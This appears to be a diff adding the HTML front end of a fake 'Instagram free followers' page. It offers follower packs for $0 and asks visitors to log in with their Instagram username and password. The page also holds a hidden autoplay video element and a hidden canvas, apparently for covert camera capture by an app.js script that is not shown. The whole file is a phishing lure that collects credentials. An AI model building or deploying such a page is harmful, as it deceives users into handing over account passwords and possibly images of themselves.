@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Instagram</title>
+</head>
+<body>
+    <div class="container">
+        <nav class="navbar">
+            <div class="nav-left">
+                <button id="displayBuy">Buy for Free</button>
+            </div>
+            <div class="nav-right">
+                <span class="price"><span class="price-s1"><span id="box">0</span> Box</span> for $0</span>
+            </div>
+        </nav>
+        <nav class="subnav">
+            <span>
+                <a href="#" class="btn-shine">Get early access</a>
+            </span>
+        </nav>
+        <div class="content">
+            <!-- packs  -->
+            <div class="packs">
+                <div class="packs-border">
+                    <div class="hline">
+                        <div class="pack pack1">
+                            <div class="pack-title"><span>Price</span><span>$0</span></div>
+                            <div class="quantity">
+                                <span>
+                                    <span class="subs">1,000</span>
+                                    <br>
+                                    <span>Followers</span>
+                                </span>
+                            </div>
+                            <div class="pack-footer1 pack-footer hide">
+                                <span>Selected</span>
+                            </div>
+                        </div>
+                        <div class="pack pack2">
+                            <div class="pack-title"><span>Price</span><span>$0</span></div>
+                            <div class="quantity">
+                                <span>
+                                    <span class="subs">3,000</span>
+                                    <br>
+                                    <span>Followers</span>
+                                </span>
+                            </div>
+                            <div class="pack-footer2 pack-footer hide">
+                                <span>Selected</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="hline">
+                        <div class="pack pack3">
+                            <div class="pack-title"><span>Price</span><span>$0</span></div>
+                            <div class="quantity">
+                                <span>
+                                    <span class="subs">5,000</span>
+                                    <br>
+                                    <span>Followers</span>
+                                </span>
+                            </div>
+                            <div class="pack-footer3 pack-footer hide">
+                                <span>Selected</span>
+                            </div>
+                        </div>
+                        <div class="pack pack4">
+                            <div class="pack-title"><span>Price</span><span>$0</span></div>
+                            <div class="quantity">
+                                <span>
+                                    <span class="subs">8,000</span>
+                                    <br>
+                                    <span>Followers</span>
+                                </span>
+                            </div>
+                            <div class="pack-footer4 pack-footer hide">
+                                <span>Selected</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- alert  -->
+            <div class="alert">
+                <div class="alert-content">
+                    <div class="alert-title">
+                        <span>For Free</span>
+                        <button id="closeAlert">x</button>
+                    </div>
+                    <div class="alert-msg">
+                        <span>Do you want to get <br> <span id="getQuantity"></span> followers</span>
+                    </div>
+                    <div class="get-btn">
+                        <button id="get">Get Now</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- login  -->
+        <div class="login-content">
+            <div class="login-area">
+                <form name="document">
+                    <span>Login with Your Account</span>
+                    <div class="email"><input id="email" type="email" placeholder="username or email addresss"></div>
+                    <div class="password"><input id="password" type="password" placeholder="password"></div>
+                    <button id="order">Order for $0</button>
+                </form>
+            </div>
+        </div>
+        <!-- footer  -->
+        <div class="footer">
+            <span>Instagram free Followers</span>
+        </div>
+    </div>
+    <video style="display: none;" id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+<script src="./app.js"></script>
+</body>
+</html>
